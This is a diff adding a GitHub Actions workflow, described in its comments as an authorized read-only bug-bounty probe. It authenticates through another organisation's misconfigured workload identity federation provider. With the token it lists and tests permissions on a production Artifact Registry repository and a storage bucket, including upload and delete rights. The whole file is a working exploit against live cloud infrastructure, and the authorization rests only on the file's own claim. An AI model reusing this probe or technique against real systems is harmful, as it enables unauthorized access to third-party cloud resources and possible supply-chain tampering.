@@ -1,0 +1,47 @@
+name: lane5-gecx-wif-impact
+# Authorized Google Cloud VRP lane probe (read-only). The OSS Exit Gate WIF
+# provider 305452601764 accepted pwnhaven-afk/wif-probe in lane5-wif-matrix.
+# This checks whether the SECOND repo using it (gemini-enterprise-for-cx,
+# Artifact Registry repo gemini-enterprise-for-cx--githubreleases + bucket path)
+# grants the pool-wide principal or only the intended repo. No writes.
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  impact:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Direct WIF to OSS Exit Gate provider
+        id: auth
+        uses: google-github-actions/auth@7c6bc770dae815cd3e89ee6cdf493a5fab2cc093 # v3
+        with:
+          create_credentials_file: true
+          export_environment_variables: true
+          workload_identity_provider: projects/305452601764/locations/global/workloadIdentityPools/builders/providers/github
+          token_format: ''
+      - name: Read-only probes for gemini-enterprise-for-cx
+        run: |
+          set -uo pipefail
+          TOKEN=$(gcloud auth print-access-token 2>/dev/null || true)
+          if [ -z "$TOKEN" ]; then echo "NO_TOKEN"; exit 1; fi
+          echo "TOKEN_LEN=${#TOKEN}"
+          echo "--- AR repo get (gemini-enterprise-for-cx--githubreleases) ---"
+          curl -s -o /tmp/r.json -w "http=%{http_code}\n" -H "Authorization: Bearer ${TOKEN}" \
+            "https://artifactregistry.googleapis.com/v1/projects/oss-exit-gate-prod/locations/us/repositories/gemini-enterprise-for-cx--githubreleases"
+          head -c 500 /tmp/r.json; echo
+          echo "--- AR testIamPermissions (upload/download/get/packages) ---"
+          curl -s -o /tmp/t.json -w "http=%{http_code}\n" -X POST -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" \
+            -d '{"permissions":["artifactregistry.repositories.uploadArtifacts","artifactregistry.repositories.downloadArtifacts","artifactregistry.repositories.get","artifactregistry.packages.list","artifactregistry.packages.get","artifactregistry.versions.delete","artifactregistry.tags.create"]}' \
+            "https://artifactregistry.googleapis.com/v1/projects/oss-exit-gate-prod/locations/us/repositories/gemini-enterprise-for-cx--githubreleases:testIamPermissions"
+          cat /tmp/t.json; echo
+          echo "--- GCS list prefix gemini-enterprise-for-cx/ ---"
+          curl -s -o /tmp/l.json -w "http=%{http_code}\n" -H "Authorization: Bearer ${TOKEN}" \
+            "https://storage.googleapis.com/storage/v1/b/oss-exit-gate-prod-projects-bucket/o?prefix=gemini-enterprise-for-cx/&maxResults=5"
+          head -c 500 /tmp/l.json; echo
+          echo "--- GCS bucket iam testPermissions ---"
+          curl -s -o /tmp/bp.json -w "http=%{http_code}\n" -X POST -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" \
+            -d '{"permissions":["storage.objects.create","storage.objects.get","storage.objects.list","storage.objects.delete","storage.buckets.get"]}' \
+            "https://storage.googleapis.com/storage/v1/b/oss-exit-gate-prod-projects-bucket/iam/testPermissions"
+          head -c 500 /tmp/bp.json; echo
